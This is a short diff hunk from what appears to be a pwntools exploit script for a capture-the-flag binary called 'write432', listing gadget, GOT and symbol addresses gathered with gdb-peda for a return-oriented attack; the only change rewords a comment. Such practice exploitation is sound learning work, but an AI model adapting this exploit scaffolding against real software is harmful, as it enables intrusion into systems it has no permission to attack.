@@ -13,7 +13,7 @@ p = process(e.path)
 p.recv() #receive the program output (necessary) 
 
 pop3ret = 0x80486d9  #gdb_peda -> ropgadget
-shellcode_addr = 0x08048000 #vmmap -> 0x08048000 0x08049000 r-xp /root/Desktop/challs/write432
+shellcode_addr = 0x08048000 #gdb_peda -> vmmap -> 0x08048000 0x08049000 r-xp /root/Desktop/challs/write432
 puts = 0x8048420 #gdb_peda -> elfsymbol
 puts_got= 0x804a014 #gdb_peda -> pd puts@plt 
 main = 0x804857b #gdb_peda -> x main
